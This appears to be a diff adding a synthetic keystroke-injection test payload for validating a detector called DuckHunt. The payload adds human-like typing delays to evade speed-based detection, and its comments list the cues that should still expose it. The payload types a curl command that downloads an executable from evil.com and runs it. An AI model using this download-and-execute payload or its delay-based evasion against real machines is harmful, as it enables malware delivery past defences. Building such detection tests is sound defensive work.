@@ -1,0 +1,46 @@
+REM DuckHunt Test Payload: Evasive Attack with Delays
+REM This is a SYNTHETIC test payload for DuckHunt detection validation
+REM Tests detection of attacks that add delays to evade speed-based detection
+
+REM Test 4: Evasive attack with human-like delays
+REM Attack adds random 100-200ms delays to mimic human typing speed
+REM However, still has detectable patterns:
+REM - Zero error rate (no corrections/backspaces)
+REM - Perfect consistency in delays (no natural variation)
+REM - Suspicious command patterns
+REM - No mouse movement during typing
+
+DELAY 100
+GUI r
+DELAY 150
+STRING cmd
+DELAY 120
+ENTER
+DELAY 200
+STRING curl
+DELAY 140
+STRING  -o
+DELAY 135
+STRING  C:\temp\payload.exe
+DELAY 145
+STRING  http://evil.com/malware.exe
+DELAY 130
+ENTER
+DELAY 200
+STRING C:\temp\payload.exe
+DELAY 140
+ENTER
+DELAY 100
+STRING exit
+DELAY 120
+ENTER
+
+REM Expected Detection:
+REM - Pattern match: WIN+R, "cmd", "curl", suspicious download
+REM - Zero error rate (even with delays, no backspaces)
+REM - Digraph timing anomalies (specific key-pairs have unnatural timing)
+REM - No mouse correlation (bot doesn't move mouse during typing)
+REM - Perfect timing consistency (human variation is statistical, not mechanical)
+
+REM Detection Confidence: Expected 0.70-0.85
+REM (Lower than fast injection, but still detectable via patterns and error rate)
